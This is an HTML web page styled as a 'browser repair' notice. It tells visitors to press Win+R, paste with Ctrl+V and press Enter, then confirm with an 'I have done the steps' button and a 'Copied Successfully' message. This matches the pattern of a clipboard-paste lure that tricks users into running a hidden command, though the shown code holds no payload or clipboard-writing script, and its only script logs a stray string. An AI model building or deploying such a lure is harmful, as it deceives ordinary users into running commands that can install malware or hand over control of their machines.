<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Repair Browser issues</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --dark-orange: #d35400;
            --dark-orange-hover: #a04000;
            --text-main: #111827;
            --text-muted: #4b5563;
            --white: #ffffff;
            --bg-page: #f8fafc;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg-page);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }

        /* Sleek Vertically Lean Card */
        .card {
            background: var(--white);
            width: 320px;
            padding: 40px 25px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
            text-align: center;
            border: 1px solid #eeeeee;
        }

        .focal-image {
            width: 120px;
            height: auto;
            margin-bottom: 20px;
        }

        h1 {
            font-size: 1.2rem;
            font-weight: 700;
            margin-bottom: 15px;
            color: var(--text-main);
        }

        .description {
            font-size: 0.85rem;
            color: var(--text-muted);
            line-height: 1.8; /* Increased line height for the icons */
            margin-bottom: 30px;
        }

        /* Unified Keycap Style - Scaled for Text */
        .key-cap {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #f3f4f6;
            border: 1px solid #d1d5db;
            border-bottom: 2px solid #9ca3af;
            border-radius: 4px;
            vertical-align: middle;
            height: 18px; /* Small height so it doesn't look huge */
            padding: 0 4px;
        }

        .win-key { width: 28px; }
        .ctrl-key { width: 38px; }
        .v-key { width: 20px; }

        .key-cap svg {
            width: 100%;
            height: 70%; /* Keeps icon/text centered inside key */
        }

        .key-sep {
            font-weight: bold;
            font-size: 0.8rem;
            margin: 0 1px;
        }

        /* Dark Orange Button */
        .copy-button {
            width: 100%;
            padding: 14px;
            background-color: var(--dark-orange);
            color: var(--white);
            border: none;
            border-radius: 10px;
            font-size: 0.9rem;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }

        .copy-button:hover { background-color: var(--dark-orange-hover); }

        .success-msg {
            visibility: hidden;
            opacity: 0;
            margin-top: 15px;
            font-size: 0.8rem;
            color: #059669;
            font-weight: 600;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            transition: 0.3s;
        }

        .success-msg.visible {
            visibility: visible;
            opacity: 1;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>Your Browser Needs A Quick Repair</h1>

        <img src="https://img.icons8.com/illustrations/external-outline-la-akira/200/external-wallet-money-and-economy-outline-la-akira.png" class="focal-image" alt="Secure">

        <p class="description">
            Press the 
            <span class="key-cap win-key">
                <svg viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg"><path d="M0 12.402l35.687-4.86.016 34.423-35.703.202zm35.687 33.91l.015 34.236-35.702-4.833V46.52zm4.457-34.633L88 0v41.933l-47.856.41zm47.856 34.567V88L40.144 81.334l-.015-34.542z" fill="#4b5563"/></svg>
            </span>
            key and the R key simultaneously <br>and then press this two keys simultaneously
            <span class="key-cap ctrl-key">
                <svg viewBox="0 0 45 20"><text x="50%" y="15" font-family="Arial" font-weight="bold" font-size="12" text-anchor="middle" fill="#4b5563">CTRL</text></svg>
            </span>
            <span class="key-sep">+</span>
            <span class="key-cap v-key">
                <svg viewBox="0 0 20 20"><text x="50%" y="15" font-family="Arial" font-weight="bold" font-size="14" text-anchor="middle" fill="#4b5563">V</text></svg>
            </span>
            <br>then press enter
        </p>

        <button class="copy-button" id="copyBtn" onclick="redirectToBlog()">I have done the steps</button>

        <div class="success-msg" id="status">
            <svg width="16" height="16" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
            Copied Successfully
        </div>
    </div>

    <script>
        const BLOG_URL=""; 
        function redirectToBlog() {
            console.log("lilalilalolalaloy");
            //window.location.href = BLOG_URL;
        }
    </script>
</body>
</html>
